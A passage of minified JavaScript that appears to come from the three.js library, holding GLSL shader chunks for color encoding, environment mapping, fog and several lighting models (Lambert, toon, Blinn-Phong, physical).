maxRange, 0.0, 1.0 );\n\tM = ceil( M * 255.0 ) / 255.0;\n\treturn vec4( value.rgb / ( M * maxRange ), M );\n}\nvec4 RGBDToLinear( in vec4 value, in float maxRange ) {\n\treturn vec4( value.rgb * ( ( maxRange / 255.0 ) / value.a ), 1.0 );\n}\nvec4 LinearToRGBD( in vec4 value, in float maxRange ) {\n\tfloat maxRGB = max( value.r, max( value.g, value.b ) );\n\tfloat D = max( maxRange / maxRGB, 1.0 );\n\tD = clamp( floor( D ) / 255.0, 0.0, 1.0 );\n\treturn vec4( value.rgb * ( D * ( 255.0 / maxRange ) ), D );\n}\nconst mat3 cLogLuvM = mat3( 0.2209, 0.3390, 0.4184, 0.1138, 0.6780, 0.7319, 0.0102, 0.1130, 0.2969 );\nvec4 LinearToLogLuv( in vec4 value ) {\n\tvec3 Xp_Y_XYZp = cLogLuvM * value.rgb;\n\tXp_Y_XYZp = max( Xp_Y_XYZp, vec3( 1e-6, 1e-6, 1e-6 ) );\n\tvec4 vResult;\n\tvResult.xy = Xp_Y_XYZp.xy / Xp_Y_XYZp.z;\n\tfloat Le = 2.0 * log2(Xp_Y_XYZp.y) + 127.0;\n\tvResult.w = fract( Le );\n\tvResult.z = ( Le - ( floor( vResult.w * 255.0 ) ) / 255.0 ) / 255.0;\n\treturn vResult;\n}\nconst mat3 cLogLuvInverseM = mat3( 6.0014, -2.7008, -1.7996, -1.3320, 3.1029, -5.7721, 0.3008, -1.0882, 5.6268 );\nvec4 LogLuvToLinear( in vec4 value ) {\n\tfloat Le = value.z * 255.0 + value.w;\n\tvec3 Xp_Y_XYZp;\n\tXp_Y_XYZp.y = exp2( ( Le - 127.0 ) / 2.0 );\n\tXp_Y_XYZp.z = Xp_Y_XYZp.y / value.y;\n\tXp_Y_XYZp.x = value.x * Xp_Y_XYZp.z;\n\tvec3 vRGB = cLogLuvInverseM * Xp_Y_XYZp.rgb;\n\treturn vec4( max( vRGB, 0.0 ), 1.0 );\n}",envmap_fragment:"#ifdef USE_ENVMAP\n\t#ifdef ENV_WORLDPOS\n\t\tvec3 cameraToFrag;\n\t\tif ( isOrthographic ) {\n\t\t\tcameraToFrag = normalize( vec3( - viewMatrix[ 0 ][ 2 ], - viewMatrix[ 1 ][ 2 ], - viewMatrix[ 2 ][ 2 ] ) );\n\t\t} else {\n\t\t\tcameraToFrag = normalize( vWorldPosition - cameraPosition );\n\t\t}\n\t\tvec3 worldNormal = inverseTransformDirection( normal, viewMatrix );\n\t\t#ifdef ENVMAP_MODE_REFLECTION\n\t\t\tvec3 reflectVec = reflect( cameraToFrag, worldNormal );\n\t\t#else\n\t\t\tvec3 reflectVec = refract( cameraToFrag, worldNormal, refractionRatio );\n\t\t#endif\n\t#else\n\t\tvec3 reflectVec = vReflect;\n\t#endif\n\t#ifdef ENVMAP_TYPE_CUBE\n\t\tvec4 envColor = textureCube( envMap, vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) );\n\t#elif defined( ENVMAP_TYPE_CUBE_UV )\n\t\tvec4 envColor = textureCubeUV( envMap, reflectVec, 0.0 );\n\t#else\n\t\tvec4 envColor = vec4( 0.0 );\n\t#endif\n\t#ifndef ENVMAP_TYPE_CUBE_UV\n\t\tenvColor = envMapTexelToLinear( envColor );\n\t#endif\n\t#ifdef ENVMAP_BLENDING_MULTIPLY\n\t\toutgoingLight = mix( outgoingLight, outgoingLight * envColor.xyz, specularStrength * reflectivity );\n\t#elif defined( ENVMAP_BLENDING_MIX )\n\t\toutgoingLight = mix( outgoingLight, envColor.xyz, specularStrength * reflectivity );\n\t#elif defined( ENVMAP_BLENDING_ADD )\n\t\toutgoingLight += envColor.xyz * specularStrength * reflectivity;\n\t#endif\n#endif",envmap_common_pars_fragment:"#ifdef USE_ENVMAP\n\tuniform float envMapIntensity;\n\tuniform float flipEnvMap;\n\tuniform int maxMipLevel;\n\t#ifdef ENVMAP_TYPE_CUBE\n\t\tuniform samplerCube envMap;\n\t#else\n\t\tuniform sampler2D envMap;\n\t#endif\n\t\n#endif",envmap_pars_fragment:"#ifdef USE_ENVMAP\n\tuniform float reflectivity;\n\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\n\t\t#define ENV_WORLDPOS\n\t#endif\n\t#ifdef ENV_WORLDPOS\n\t\tvarying vec3 vWorldPosition;\n\t\tuniform float refractionRatio;\n\t#else\n\t\tvarying vec3 vReflect;\n\t#endif\n#endif",envmap_pars_vertex:"#ifdef USE_ENVMAP\n\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) ||defined( PHONG )\n\t\t#define ENV_WORLDPOS\n\t#endif\n\t#ifdef ENV_WORLDPOS\n\t\t\n\t\tvarying vec3 vWorldPosition;\n\t#else\n\t\tvarying vec3 vReflect;\n\t\tuniform float refractionRatio;\n\t#endif\n#endif",envmap_physical_pars_fragment:"#if defined( USE_ENVMAP )\n\t#ifdef ENVMAP_MODE_REFRACTION\n\t\tuniform float refractionRatio;\n\t#endif\n\tvec3 getLightProbeIndirectIrradiance( const in GeometricContext geometry, const in int maxMIPLevel ) {\n\t\tvec3 worldNormal = inverseTransformDirection( geometry.normal, viewMatrix );\n\t\t#ifdef ENVMAP_TYPE_CUBE\n\t\t\tvec3 queryVec = vec3( flipEnvMap * worldNormal.x, worldNormal.yz );\n\t\t\t#ifdef TEXTURE_LOD_EXT\n\t\t\t\tvec4 envMapColor = textureCubeLodEXT( envMap, queryVec, float( maxMIPLevel ) );\n\t\t\t#else\n\t\t\t\tvec4 envMapColor = textureCube( envMap, queryVec, float( maxMIPLevel ) );\n\t\t\t#endif\n\t\t\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\n\t\t#elif defined( ENVMAP_TYPE_CUBE_UV )\n\t\t\tvec4 envMapColor = textureCubeUV( envMap, worldNormal, 1.0 );\n\t\t#else\n\t\t\tvec4 envMapColor = vec4( 0.0 );\n\t\t#endif\n\t\treturn PI * envMapColor.rgb * envMapIntensity;\n\t}\n\tfloat getSpecularMIPLevel( const in float roughness, const in int maxMIPLevel ) {\n\t\tfloat maxMIPLevelScalar = float( maxMIPLevel );\n\t\tfloat sigma = PI * roughness * roughness / ( 1.0 + roughness );\n\t\tfloat desiredMIPLevel = maxMIPLevelScalar + log2( sigma );\n\t\treturn clamp( desiredMIPLevel, 0.0, maxMIPLevelScalar );\n\t}\n\tvec3 getLightProbeIndirectRadiance( const in vec3 viewDir, const in vec3 normal, const in float roughness, const in int maxMIPLevel ) {\n\t\t#ifdef ENVMAP_MODE_REFLECTION\n\t\t\tvec3 reflectVec = reflect( -viewDir, normal );\n\t\t\treflectVec = normalize( mix( reflectVec, normal, roughness * roughness) );\n\t\t#else\n\t\t\tvec3 reflectVec = refract( -viewDir, normal, refractionRatio );\n\t\t#endif\n\t\treflectVec = inverseTransformDirection( reflectVec, viewMatrix );\n\t\tfloat specularMIPLevel = getSpecularMIPLevel( roughness, maxMIPLevel );\n\t\t#ifdef ENVMAP_TYPE_CUBE\n\t\t\tvec3 queryReflectVec = vec3( flipEnvMap * reflectVec.x, reflectVec.yz );\n\t\t\t#ifdef TEXTURE_LOD_EXT\n\t\t\t\tvec4 envMapColor = textureCubeLodEXT( envMap, queryReflectVec, specularMIPLevel );\n\t\t\t#else\n\t\t\t\tvec4 envMapColor = textureCube( envMap, queryReflectVec, specularMIPLevel );\n\t\t\t#endif\n\t\t\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\n\t\t#elif defined( ENVMAP_TYPE_CUBE_UV )\n\t\t\tvec4 envMapColor = textureCubeUV( envMap, reflectVec, roughness );\n\t\t#endif\n\t\treturn envMapColor.rgb * envMapIntensity;\n\t}\n#endif",envmap_vertex:"#ifdef USE_ENVMAP\n\t#ifdef ENV_WORLDPOS\n\t\tvWorldPosition = worldPosition.xyz;\n\t#else\n\t\tvec3 cameraToVertex;\n\t\tif ( isOrthographic ) {\n\t\t\tcameraToVertex = normalize( vec3( - viewMatrix[ 0 ][ 2 ], - viewMatrix[ 1 ][ 2 ], - viewMatrix[ 2 ][ 2 ] ) );\n\t\t} else {\n\t\t\tcameraToVertex = normalize( worldPosition.xyz - cameraPosition );\n\t\t}\n\t\tvec3 worldNormal = inverseTransformDirection( transformedNormal, viewMatrix );\n\t\t#ifdef ENVMAP_MODE_REFLECTION\n\t\t\tvReflect = reflect( cameraToVertex, worldNormal );\n\t\t#else\n\t\t\tvReflect = refract( cameraToVertex, worldNormal, refractionRatio );\n\t\t#endif\n\t#endif\n#endif",fog_vertex:"#ifdef USE_FOG\n\tfogDepth = - mvPosition.z;\n#endif",fog_pars_vertex:"#ifdef USE_FOG\n\tvarying float fogDepth;\n#endif",fog_fragment:"#ifdef USE_FOG\n\t#ifdef FOG_EXP2\n\t\tfloat fogFactor = 1.0 - exp( - fogDensity * fogDensity * fogDepth * fogDepth );\n\t#else\n\t\tfloat fogFactor = smoothstep( fogNear, fogFar, fogDepth );\n\t#endif\n\tgl_FragColor.rgb = mix( gl_FragColor.rgb, fogColor, fogFactor );\n#endif",fog_pars_fragment:"#ifdef USE_FOG\n\tuniform vec3 fogColor;\n\tvarying float fogDepth;\n\t#ifdef FOG_EXP2\n\t\tuniform float fogDensity;\n\t#else\n\t\tuniform float fogNear;\n\t\tuniform float fogFar;\n\t#endif\n#endif",gradientmap_pars_fragment:"#ifdef USE_GRADIENTMAP\n\tuniform sampler2D gradientMap;\n#endif\nvec3 getGradientIrradiance( vec3 normal, vec3 lightDirection ) {\n\tfloat dotNL = dot( normal, lightDirection );\n\tvec2 coord = vec2( dotNL * 0.5 + 0.5, 0.0 );\n\t#ifdef USE_GRADIENTMAP\n\t\treturn texture2D( gradientMap, coord ).rgb;\n\t#else\n\t\treturn ( coord.x < 0.7 ) ? vec3( 0.7 ) : vec3( 1.0 );\n\t#endif\n}",lightmap_fragment:"#ifdef USE_LIGHTMAP\n\tvec4 lightMapTexel= texture2D( lightMap, vUv2 );\n\treflectedLight.indirectDiffuse += PI * lightMapTexelToLinear( lightMapTexel ).rgb * lightMapIntensity;\n#endif",lightmap_pars_fragment:"#ifdef USE_LIGHTMAP\n\tuniform sampler2D lightMap;\n\tuniform float lightMapIntensity;\n#endif",lights_lambert_vertex:"vec3 diffuse = vec3( 1.0 );\nGeometricContext geometry;\ngeometry.position = mvPosition.xyz;\ngeometry.normal = normalize( transformedNormal );\ngeometry.viewDir = ( isOrthographic ) ? vec3( 0, 0, 1 ) : normalize( -mvPosition.xyz );\nGeometricContext backGeometry;\nbackGeometry.position = geometry.position;\nbackGeometry.normal = -geometry.normal;\nbackGeometry.viewDir = geometry.viewDir;\nvLightFront = vec3( 0.0 );\nvIndirectFront = vec3( 0.0 );\n#ifdef DOUBLE_SIDED\n\tvLightBack = vec3( 0.0 );\n\tvIndirectBack = vec3( 0.0 );\n#endif\nIncidentLight directLight;\nfloat dotNL;\nvec3 directLightColor_Diffuse;\nvIndirectFront += getAmbientLightIrradiance( ambientLightColor );\nvIndirectFront += getLightProbeIrradiance( lightProbe, geometry );\n#ifdef DOUBLE_SIDED\n\tvIndirectBack += getAmbientLightIrradiance( ambientLightColor );\n\tvIndirectBack += getLightProbeIrradiance( lightProbe, backGeometry );\n#endif\n#if NUM_POINT_LIGHTS > 0\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\n\t\tgetPointDirectLightIrradiance( pointLights[ i ], geometry, directLight );\n\t\tdotNL = dot( geometry.normal, directLight.direction );\n\t\tdirectLightColor_Diffuse = PI * directLight.color;\n\t\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\n\t\t#ifdef DOUBLE_SIDED\n\t\t\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\n\t\t#endif\n\t}\n\t#pragma unroll_loop_end\n#endif\n#if NUM_SPOT_LIGHTS > 0\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\n\t\tgetSpotDirectLightIrradiance( spotLights[ i ], geometry, directLight );\n\t\tdotNL = dot( geometry.normal, directLight.direction );\n\t\tdirectLightColor_Diffuse = PI * directLight.color;\n\t\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\n\t\t#ifdef DOUBLE_SIDED\n\t\t\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\n\t\t#endif\n\t}\n\t#pragma unroll_loop_end\n#endif\n#if NUM_DIR_LIGHTS > 0\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\n\t\tgetDirectionalDirectLightIrradiance( directionalLights[ i ], geometry, directLight );\n\t\tdotNL = dot( geometry.normal, directLight.direction );\n\t\tdirectLightColor_Diffuse = PI * directLight.color;\n\t\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\n\t\t#ifdef DOUBLE_SIDED\n\t\t\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\n\t\t#endif\n\t}\n\t#pragma unroll_loop_end\n#endif\n#if NUM_HEMI_LIGHTS > 0\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {\n\t\tvIndirectFront += getHemisphereLightIrradiance( hemisphereLights[ i ], geometry );\n\t\t#ifdef DOUBLE_SIDED\n\t\t\tvIndirectBack += getHemisphereLightIrradiance( hemisphereLights[ i ], backGeometry );\n\t\t#endif\n\t}\n\t#pragma unroll_loop_end\n#endif",lights_pars_begin:"uniform bool receiveShadow;\nuniform vec3 ambientLightColor;\nuniform vec3 lightProbe[ 9 ];\nvec3 shGetIrradianceAt( in vec3 normal, in vec3 shCoefficients[ 9 ] ) {\n\tfloat x = normal.x, y = normal.y, z = normal.z;\n\tvec3 result = shCoefficients[ 0 ] * 0.886227;\n\tresult += shCoefficients[ 1 ] * 2.0 * 0.511664 * y;\n\tresult += shCoefficients[ 2 ] * 2.0 * 0.511664 * z;\n\tresult += shCoefficients[ 3 ] * 2.0 * 0.511664 * x;\n\tresult += shCoefficients[ 4 ] * 2.0 * 0.429043 * x * y;\n\tresult += shCoefficients[ 5 ] * 2.0 * 0.429043 * y * z;\n\tresult += shCoefficients[ 6 ] * ( 0.743125 * z * z - 0.247708 );\n\tresult += shCoefficients[ 7 ] * 2.0 * 0.429043 * x * z;\n\tresult += shCoefficients[ 8 ] * 0.429043 * ( x * x - y * y );\n\treturn result;\n}\nvec3 getLightProbeIrradiance( const in vec3 lightProbe[ 9 ], const in GeometricContext geometry ) {\n\tvec3 worldNormal = inverseTransformDirection( geometry.normal, viewMatrix );\n\tvec3 irradiance = shGetIrradianceAt( worldNormal, lightProbe );\n\treturn irradiance;\n}\nvec3 getAmbientLightIrradiance( const in vec3 ambientLightColor ) {\n\tvec3 irradiance = ambientLightColor;\n\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\t\tirradiance *= PI;\n\t#endif\n\treturn irradiance;\n}\n#if NUM_DIR_LIGHTS > 0\n\tstruct DirectionalLight {\n\t\tvec3 direction;\n\t\tvec3 color;\n\t};\n\tuniform DirectionalLight directionalLights[ NUM_DIR_LIGHTS ];\n\tvoid getDirectionalDirectLightIrradiance( const in DirectionalLight directionalLight, const in GeometricContext geometry, out IncidentLight directLight ) {\n\t\tdirectLight.color = directionalLight.color;\n\t\tdirectLight.direction = directionalLight.direction;\n\t\tdirectLight.visible = true;\n\t}\n#endif\n#if NUM_POINT_LIGHTS > 0\n\tstruct PointLight {\n\t\tvec3 position;\n\t\tvec3 color;\n\t\tfloat distance;\n\t\tfloat decay;\n\t};\n\tuniform PointLight pointLights[ NUM_POINT_LIGHTS ];\n\tvoid getPointDirectLightIrradiance( const in PointLight pointLight, const in GeometricContext geometry, out IncidentLight directLight ) {\n\t\tvec3 lVector = pointLight.position - geometry.position;\n\t\tdirectLight.direction = normalize( lVector );\n\t\tfloat lightDistance = length( lVector );\n\t\tdirectLight.color = pointLight.color;\n\t\tdirectLight.color *= punctualLightIntensityToIrradianceFactor( lightDistance, pointLight.distance, pointLight.decay );\n\t\tdirectLight.visible = ( directLight.color != vec3( 0.0 ) );\n\t}\n#endif\n#if NUM_SPOT_LIGHTS > 0\n\tstruct SpotLight {\n\t\tvec3 position;\n\t\tvec3 direction;\n\t\tvec3 color;\n\t\tfloat distance;\n\t\tfloat decay;\n\t\tfloat coneCos;\n\t\tfloat penumbraCos;\n\t};\n\tuniform SpotLight spotLights[ NUM_SPOT_LIGHTS ];\n\tvoid getSpotDirectLightIrradiance( const in SpotLight spotLight, const in GeometricContext geometry, out IncidentLight directLight ) {\n\t\tvec3 lVector = spotLight.position - geometry.position;\n\t\tdirectLight.direction = normalize( lVector );\n\t\tfloat lightDistance = length( lVector );\n\t\tfloat angleCos = dot( directLight.direction, spotLight.direction );\n\t\tif ( angleCos > spotLight.coneCos ) {\n\t\t\tfloat spotEffect = smoothstep( spotLight.coneCos, spotLight.penumbraCos, angleCos );\n\t\t\tdirectLight.color = spotLight.color;\n\t\t\tdirectLight.color *= spotEffect * punctualLightIntensityToIrradianceFactor( lightDistance, spotLight.distance, spotLight.decay );\n\t\t\tdirectLight.visible = true;\n\t\t} else {\n\t\t\tdirectLight.color = vec3( 0.0 );\n\t\t\tdirectLight.visible = false;\n\t\t}\n\t}\n#endif\n#if NUM_RECT_AREA_LIGHTS > 0\n\tstruct RectAreaLight {\n\t\tvec3 color;\n\t\tvec3 position;\n\t\tvec3 halfWidth;\n\t\tvec3 halfHeight;\n\t};\n\tuniform sampler2D ltc_1;\tuniform sampler2D ltc_2;\n\tuniform RectAreaLight rectAreaLights[ NUM_RECT_AREA_LIGHTS ];\n#endif\n#if NUM_HEMI_LIGHTS > 0\n\tstruct HemisphereLight {\n\t\tvec3 direction;\n\t\tvec3 skyColor;\n\t\tvec3 groundColor;\n\t};\n\tuniform HemisphereLight hemisphereLights[ NUM_HEMI_LIGHTS ];\n\tvec3 getHemisphereLightIrradiance( const in HemisphereLight hemiLight, const in GeometricContext geometry ) {\n\t\tfloat dotNL = dot( geometry.normal, hemiLight.direction );\n\t\tfloat hemiDiffuseWeight = 0.5 * dotNL + 0.5;\n\t\tvec3 irradiance = mix( hemiLight.groundColor, hemiLight.skyColor, hemiDiffuseWeight );\n\t\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\t\t\tirradiance *= PI;\n\t\t#endif\n\t\treturn irradiance;\n\t}\n#endif",lights_toon_fragment:"ToonMaterial material;\nmaterial.diffuseColor = diffuseColor.rgb;",lights_toon_pars_fragment:"varying vec3 vViewPosition;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n#endif\nstruct ToonMaterial {\n\tvec3 diffuseColor;\n};\nvoid RE_Direct_Toon( const in IncidentLight directLight, const in GeometricContext geometry, const in ToonMaterial material, inout ReflectedLight reflectedLight ) {\n\tvec3 irradiance = getGradientIrradiance( geometry.normal, directLight.direction ) * directLight.color;\n\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\t\tirradiance *= PI;\n\t#endif\n\treflectedLight.directDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\n}\nvoid RE_IndirectDiffuse_Toon( const in vec3 irradiance, const in GeometricContext geometry, const in ToonMaterial material, inout ReflectedLight reflectedLight ) {\n\treflectedLight.indirectDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\n}\n#define RE_Direct\t\t\t\tRE_Direct_Toon\n#define RE_IndirectDiffuse\t\tRE_IndirectDiffuse_Toon\n#define Material_LightProbeLOD( material )\t(0)",lights_phong_fragment:"BlinnPhongMaterial material;\nmaterial.diffuseColor = diffuseColor.rgb;\nmaterial.specularColor = specular;\nmaterial.specularShininess = shininess;\nmaterial.specularStrength = specularStrength;",lights_phong_pars_fragment:"varying vec3 vViewPosition;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n#endif\nstruct BlinnPhongMaterial {\n\tvec3 diffuseColor;\n\tvec3 specularColor;\n\tfloat specularShininess;\n\tfloat specularStrength;\n};\nvoid RE_Direct_BlinnPhong( const in IncidentLight directLight, const in GeometricContext geometry, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {\n\tfloat dotNL = saturate( dot( geometry.normal, directLight.direction ) );\n\tvec3 irradiance = dotNL * directLight.color;\n\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\t\tirradiance *= PI;\n\t#endif\n\treflectedLight.directDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\n\treflectedLight.directSpecular += irradiance * BRDF_Specular_BlinnPhong( directLight, geometry, material.specularColor, material.specularShininess ) * material.specularStrength;\n}\nvoid RE_IndirectDiffuse_BlinnPhong( const in vec3 irradiance, const in GeometricContext geometry, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {\n\treflectedLight.indirectDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\n}\n#define RE_Direct\t\t\t\tRE_Direct_BlinnPhong\n#define RE_IndirectDiffuse\t\tRE_IndirectDiffuse_BlinnPhong\n#define Material_LightProbeLOD( material )\t(0)",lights_physical_fragment:"PhysicalMaterial material;\nmaterial.diffuseColor = diffuseColor.rgb * ( 1.0 - metalnessFactor );\nvec3 dxy = max( abs( dFdx( geometryNormal ) ), abs( dFdy( geometryNormal ) ) );\nfloat geometryRoughness = max( max( dxy.x, dxy.y ), dxy.z );\nmaterial.specularRoughness = max( roughnessFactor, 0.0525 );material.specularRoughness += geometryRoughness;\nmaterial.specularRoughness = min( material.specularRoughness, 1.0 );\n#ifdef REFLECTIVITY\n\tmaterial.specularColor = mix( vec3( MAXIMUM_SPECULAR_COEFFICIENT * pow2( reflectivity ) ), diffuseColor.rgb, metalnessFactor );\n#else\n\tmaterial.specularColor = mix( vec3( DEFAULT_SPECULAR_COEFFICIENT ), diffuseColor.rgb, metalnessFactor );\n#endif\n#ifdef CLEARCOAT\n\tmaterial.clearcoat = clearcoat;\n\tmaterial.clearcoatRoughness = clearcoatRoughness;\n\t#ifdef USE_CLEARCOATMAP\n\t\tmaterial.clearcoat *= texture2D( clearcoatMap, vUv ).x;\n\t#endif\n\t#ifdef USE_CLEARCOAT_ROUGHNESSMAP\n\t\tmaterial.clearcoatRoughness *= texture2D( clearcoatRoughnessMap, vUv ).y;\n\t#endif\n\tmaterial.clearcoat = saturate( material.clearcoat );\tmaterial.clearcoatRoughness = max( material.clearcoatRoughness, 0.0525 );\n\tmaterial.clearcoatRoughness += geometryRoughness;\n\tmaterial.clearcoatRoughness = min( material.clearcoatRoughness, 1.0 );\n#endif\n#ifdef USE_SHEEN\n\tmaterial.sheenColor = sheen;\n#endif",lights_physical_pars_fragment:"struct PhysicalMaterial {\n\tvec3 diffuseColor;\n\tfloat specularRoughness;\n\tvec3 specularColor;\n#ifdef CLEARCOAT\n\tfloat clearcoat;\n\tfloat clearcoatRoughness;\n#endif\n#ifdef USE_SHEEN\n\tvec3 sheenColor;\n#endif\n};\n#define MAXIMUM_SPECULAR_COEFFICIENT 0.16\n#define DEFAULT_SPECULAR_COEFFICIENT 0.04\nfloat clearcoatDHRApprox( const in float roughness, const in float dotNL ) {\n\treturn DEFAULT_SPECULAR_COEFFICIENT + ( 1.0 - DEFAULT_SPECULAR_COEFFICIENT ) * ( pow( 1.0 - dotNL, 5.0 ) * pow( 1.0 - roughness, 2.0 ) );\n}\n#if NUM_RECT_AREA_LIGHTS > 0\n\tvoid RE_Direct_RectArea_Physical( const in RectAreaLight rectAreaLight, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\n\t\tvec3 normal = geometry.normal;\n\t\tvec3 viewDir = geometry.viewDir;\n\t\tvec3 position = geometry.position;\n\t\tvec3 lightPos = rectAreaLight.position;\n\t\tvec3 halfWidth = rectAreaLight.halfWidth;\n\t\tvec3 halfHeight = rectAreaLight.halfHeight;\n\t\tvec3 lightColor = rectAreaLight.color;\n\t\tfloat roughness = material.specularRoughness;\n\t\tvec3 rectCoords[ 4 ];\n\t\trectCoords[ 0 ] = lightPos + halfWidth - halfHeight;\t\trectCoords[ 1 ] = lightPos - halfWidth - halfHeight;\n\t\trectCoords[ 2 ] = lightPos - halfWidth + halfHeight;\n\t\trectCoords[ 3 ] = lightPos + halfWidth + halfHeight;\n\t\tvec2 uv = LTC_Uv( normal, viewDir, roughness );\n\t\tvec4 t1 = texture2D( ltc_1, uv );\n\t\tvec4 t2 = texture2D( ltc_2, uv );\n\t\tmat3 mInv = mat3(\n\t\t\tvec3( t1.x, 0, t1.y ),\n\t\t\tvec3(\t\t0, 1,\t\t0 ),\n\t\t\tvec3( t1.z, 0, t1.w )\n\t\t);\n\t\tvec3 fresnel = ( material.specularColor * t2.x + ( vec3( 1.0 ) - material.specularColor ) * t2.y );\n\t\treflectedLight.directSpecular += lightColor * fresnel * LTC_Evaluate( normal, viewDir, position, mInv, rectCoords );\n\t\treflectedLight.directDiffuse += lightColor * material.diffuseColor * LTC_Evaluate( normal, viewDir, position, mat3( 1.0 ), rectCoords );\n\t}\n#endif\nvoid RE_Direct_Physical( const in IncidentLight directLight, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\n\tfloat dotNL = saturate( dot( geometry.normal, directLight.direction ) );\n\tvec3 irradiance = dotNL * directLight.color;\n\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\t\tirradiance *= PI;\n\t#endif\n\t#ifdef CLEARCOAT\n\t\tfloat ccDotNL = saturate( dot( geometry.clearcoatNormal, directLight.direction ) );\n\t\tvec3 ccIrradiance = ccDotNL * directLight.color;\n\t\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\t\t\tccIrradiance *= PI;\n\t\t#endif\n\t\tfloat clearcoatDHR = material.clearcoat * clearcoatDHRApprox( material.clearcoatRoughness, ccDotNL );\n\t\treflectedLight.directSpecular += ccIrradiance * material.clearcoat * BRDF_Specular_GGX( directLight, geometry.viewDir, geometry.clearcoatNormal, vec3( DEFAULT_SPECULAR_COEFFICIENT ), material.clearcoatRoughness );\n\t#else\n\t\tfloat clearcoatDHR = 0.0;\n\t#endif\n\t#ifdef USE_SHEEN\n\t\treflectedLight.directSpecular += ( 1.0 - clearcoatDHR ) * irradiance * BRDF_Specular_Sheen(\n\t\t\tmaterial.specularRoughness,\n\t\t\tdirectLight.direction,\n\t\t\tgeometry,\n\t\t\tmaterial.sheenColor\n\t\t);\n\t#else\n\t\treflectedLight.directSpecular += ( 1.0 - clearcoatDHR ) * irradiance * BRDF_Specular_GGX( directLight, geometry.viewDir, geometry.normal, material.specularColor, material.specularRoughness);\n\t#endif\n\treflectedLight.directDiffuse += ( 1.0 - clearcoatDHR ) * irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\n}\nvoid RE_IndirectDiffuse_Physical( const in vec3 irradiance, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\n\treflectedLight.indirectDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\n}\nvoid RE_IndirectSpecular_Physical( const in vec3 radiance, const in vec3 irradiance, const in vec3 clearcoatRadiance, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight) {\n\t#ifdef CLEARCOAT\n\t\tfloat ccDotNV = saturate( dot( geometry.clearcoatNormal, geometry.viewDir ) );\n\t\treflectedLight.indirectSpecular += clearcoatRadiance * material.clearcoat * BRDF_Specular_GGX_Environment( geometry.viewDir, geometry.clearcoatNormal, vec3( DEFAULT_SPECULAR_COEFFICIENT ), material.clearcoatRoughness );\n\t\tfloat ccDotNL = ccDotNV;\n\t\tfloat clearcoatDHR = material.clearcoat * clearcoatDHRApprox( material.clearcoatRoughness, ccDotNL );\n\t#else\n\t\tfloat clearcoatDHR = 0.0;\n\t#endif\n\tfloat clearcoatInv = 1.0 - clearcoatDHR;\n\tvec3 singleScattering = vec3( 0.0 );\n\tvec3 multiScattering = vec3( 0.0 );\n\tvec3 cosineWeightedIrradiance = irradiance * RECIPROCAL_PI;\n\tBRDF_Specular_Multiscattering_Environment( geometry, material.specularColor, material.specularRoughness, singleScattering, multiScattering );\n\tvec3 diffuse = material.diffuseColor * ( 1.0 - ( singleScattering + multiScattering ) );\n\treflectedLight.indirectSpecular += clearcoatInv * radiance * singleScattering;\n\treflectedLight.indirectSpecular += multiScattering * cosineWeightedIrradiance;\n\treflectedLight.indirectDiffuse += diffuse * cosineWeightedIrradiance;\n}\n#define RE_Direct\t\t\t\tRE_Direct_Physical\n#define RE_Direct_RectArea\t\tRE_Direct_RectArea_Physical\n#define RE_IndirectDiffuse\t\tRE_IndirectDiffuse_Physical\n#define RE_IndirectSpecular\t\tRE_IndirectSpecular_Physical\nfloat computeSpecularOcclusion( const in float dotNV, const in float ambientOcclusion, const in float roughness ) {\n\treturn saturate( pow( dotNV + ambientOcclusion, exp2( - 16.0 * roughness - 1.0 ) ) - 1.0 + ambientOcclusion );\n}",lights_fragment_begin:"\nGeometricContext geometry;\ngeometry.position = - vViewPosition;\ngeometry.normal = normal;\ngeometry.viewDir = ( isOrthographic ) ? vec3( 0, 0, 1 ) : normalize( vViewPosition );\n#ifdef CLEARCOAT\n\tgeometry.clearcoatNormal = clearcoatNormal;\n#endif\nIncidentLight directLight;\n#if ( NUM_POINT_LIGHTS > 0 ) && defined( RE_Direct )\n\tPointLight pointLight;\n\t#if defined( USE_SHADOWMAP ) && NUM_POINT_LIGHT_SHADOWS > 0\n\tPointLightShadow pointLightShadow;\n\t#endif\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\n\t\tpointLight = pointLights[ i ];\n\t\tgetPointDirectLightIrradiance( pointLight, geometry, 